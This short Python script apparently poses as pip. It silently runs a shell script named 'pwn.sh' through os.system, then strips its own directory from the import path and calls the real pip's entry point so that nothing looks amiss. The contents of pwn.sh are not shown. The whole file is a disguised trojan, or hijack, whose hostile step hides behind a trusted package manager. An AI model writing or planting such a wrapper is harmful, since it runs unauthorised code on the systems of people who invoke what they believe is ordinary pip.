import os
import sys
import subprocess

# Run the pwn script
os.system("bash pwn.sh")

# Try to run real pip
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir in sys.path:
    sys.path.remove(current_dir)

try:
    import pip
    from pip._internal.cli.main import main
    if __name__ == "__main__":
        sys.exit(main())
except Exception:
    sys.exit(0)
